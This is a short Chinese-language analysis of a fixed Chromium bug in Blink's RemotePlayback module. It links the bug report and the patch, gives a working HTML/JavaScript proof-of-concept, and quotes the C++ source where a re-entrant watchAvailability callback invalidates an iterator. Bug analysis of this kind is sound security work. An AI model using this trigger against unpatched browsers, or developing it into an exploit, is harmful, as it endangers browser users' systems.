https://bugs.chromium.org/p/chromium/issues/detail?id=1108497

补丁：
https://chromium-review.googlesource.com/c/chromium/src/+/2314981/3/third_party/blink/renderer/modules/remoteplayback/remote_playback.cc

通过复制了临时变量来防止执行过程中迭代器失效。

poc：

```
<html>
  <head>
    <script>
      function trigger() {
        let audio = new Audio('/wav.wav');
        document.body.appendChild(audio);
        function callback(v) {
          if (v)
            for (var i = 0; i < 4; i++)
              audio.remote.watchAvailability((v) => {i});
        }
        audio.addEventListener('canplay', function() {
          for (var i = 0; i < 4; i++) audio.remote.watchAvailability(callback);
        });
      }
  </script>
  </head>
  <body onload="trigger()">
  </body>
</html>
```

漏洞成因：

调用watchAvailability可以向availability_callbacks_中添加callback：
```
int RemotePlayback::WatchAvailabilityInternal(
    AvailabilityCallbackWrapper* callback) {
  if (RuntimeEnabledFeatures::RemotePlaybackBackendEnabled() &&
      IsBackgroundAvailabilityMonitoringDisabled()) {
    return kWatchAvailabilityNotSupported;
  }

  int id;
  do {
    id = GetExecutionContext()->CircularSequentialID();
  } while (!availability_callbacks_.insert(id, callback).is_new_entry);

  // Report the current availability via the callback.
  // TODO(yuryu): Wrapping notifyInitialAvailability with base::OnceClosure as
  // InspectorInstrumentation requires a globally unique pointer to track tasks.
  // We can remove the wrapper if InspectorInstrumentation returns a task id.
  base::OnceClosure task = WTF::Bind(&RemotePlayback::NotifyInitialAvailability,
                                     WrapPersistent(this), id);
  std::unique_ptr<probe::AsyncTaskId> task_id =
      std::make_unique<probe::AsyncTaskId>();
  probe::AsyncTaskScheduled(GetExecutionContext(), "watchAvailabilityCallback",
                            task_id.get());
  GetExecutionContext()
      ->GetTaskRunner(TaskType::kMediaElementEvent)
      ->PostTask(FROM_HERE, WTF::Bind(RunRemotePlaybackTask,
                                      WrapPersistent(GetExecutionContext()),
                                      WTF::Passed(std::move(task)),
                                      WTF::Passed(std::move(task_id))));

  MaybeStartListeningForAvailability();
  return id;
}
```

如果availabilityCallback调用watchAvailability()（即callback->Run处），就可能会导致availability_callbacks_被重新分配，导致for (auto& callback : availability_callbacks_.Values())中的迭代器失效。
```
void RemotePlayback::AvailabilityChanged(
    mojom::blink::ScreenAvailability availability) {
  DCHECK(is_listening_);
  DCHECK_NE(availability, mojom::ScreenAvailability::UNKNOWN);
  DCHECK_NE(availability, mojom::ScreenAvailability::DISABLED);

  if (availability_ == availability)
    return;

  bool old_availability = RemotePlaybackAvailable();
  availability_ = availability;
  bool new_availability = RemotePlaybackAvailable();
  if (new_availability == old_availability)
    return;

  for (auto& callback : availability_callbacks_.Values())
    callback->Run(this, new_availability); // invokes user script; can invalidate the iterator for the for loop
}
```
